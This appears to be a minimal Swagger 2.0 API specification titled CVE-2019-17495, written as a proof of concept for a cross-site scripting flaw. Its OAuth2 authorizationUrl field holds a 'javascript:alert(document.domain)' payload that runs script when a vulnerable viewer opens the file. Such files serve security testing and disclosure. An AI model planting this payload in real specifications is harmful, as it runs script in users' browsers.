swagger: "2.0"
info:
  title: CVE-2019-17495
  version: "1.0"
securityDefinitions:
  oauth2:
    type: oauth2
    authorizationUrl: "javascript:alert(document.domain)//"
    flow: implicit
    scopes:
      read: read
paths:
  /:
    get:
      security:
        - oauth2: [read]
      responses:
        200:
          description: ok
